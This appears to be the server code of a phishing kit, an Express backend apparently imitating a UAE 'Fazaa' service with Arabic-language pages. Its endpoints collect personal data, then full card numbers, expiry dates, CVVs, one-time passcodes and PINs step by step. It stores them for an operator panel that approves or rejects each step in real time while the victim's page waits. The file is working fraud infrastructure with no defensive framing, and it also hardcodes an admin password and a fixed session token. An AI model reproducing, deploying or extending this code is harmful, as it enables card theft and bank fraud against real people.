const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Custom routing
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index_ar.html'));
});

app.use(express.static(path.join(__dirname, './')));

let orders = [];
const ADMIN_PASSWORD = 'Fazaa12345@@';

// API Routes
app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        res.json({ success: true, token: 'authenticated_session_token' });
    } else {
        res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
    }
});

// Step 1: Client submits personal data from index_ar.html
app.post('/submit-data', (req, res) => {
    const data = req.body;
    const orderId = Date.now().toString();
    const order = {
        id: orderId,
        timestamp: new Date().toLocaleString('ar-AE'),
        status: 'personal_data_submitted',
        ...data,
        cardName: '',
        cardNumber: '',
        expiryDate: '',
        cvv: '',
        otp: '',
        pin: '',
        lastError: ''
    };
    orders.push(order);
    res.json({ success: true, orderId: orderId });
});

// Step 2: Client submits card data from payment_new_ar.html
app.post('/submit-card', (req, res) => {
    const { orderId, cardName, cardNumber, expiryDate, cvv } = req.body;
    const order = orders.find(o => o.id === orderId);
    if (order) {
        order.cardName = cardName;
        order.cardNumber = cardNumber;
        order.expiryDate = expiryDate;
        order.cvv = cvv;
        order.status = 'waiting_payment'; // Match fazaa_admin.html
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

// Step 3: Client submits OTP
app.post('/submit-otp', (req, res) => {
    const { orderId, otp } = req.body;
    const order = orders.find(o => o.id === orderId);
    if (order) {
        order.otp = otp;
        order.status = 'waiting_otp'; // Match fazaa_admin.html
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

// Step 4: Client submits PIN
app.post('/submit-pin', (req, res) => {
    const { orderId, pin } = req.body;
    const order = orders.find(o => o.id === orderId);
    if (order) {
        order.pin = pin;
        order.status = 'waiting_pin'; // Match fazaa_admin.html
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

// Polling endpoint for client to check status and get redirected
app.get('/api/check-status/:orderId', (req, res) => {
    const order = orders.find(o => o.id === req.params.orderId);
    if (order) {
        res.json({ 
            status: order.status, 
            lastError: order.lastError 
        });
    } else {
        res.status(404).json({ success: false });
    }
});

// Admin endpoint to update status (Approve/Reject)
app.post('/api/update-order-status', (req, res) => {
    const authHeader = req.headers.authorization;
    if (authHeader !== 'authenticated_session_token') {
        return res.status(403).json({ success: false });
    }
    const { orderId, status, error } = req.body;
    const order = orders.find(o => o.id === orderId);
    if (order) {
        order.status = status;
        if (error) order.lastError = error;
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

app.get('/api/get-data', (req, res) => {
    const authHeader = req.headers.authorization;
    if (authHeader === 'authenticated_session_token') {
        res.json(orders);
    } else {
        res.status(403).json({ success: false });
    }
});

app.get('/:page.html', (req, res) => {
    res.sendFile(path.join(__dirname, req.params.page + '.html'), (err) => {
        if (err) res.status(404).send('Page not found');
    });
});

app.listen(PORT, () => {
    console.log('Server is running on port ' + PORT);
});
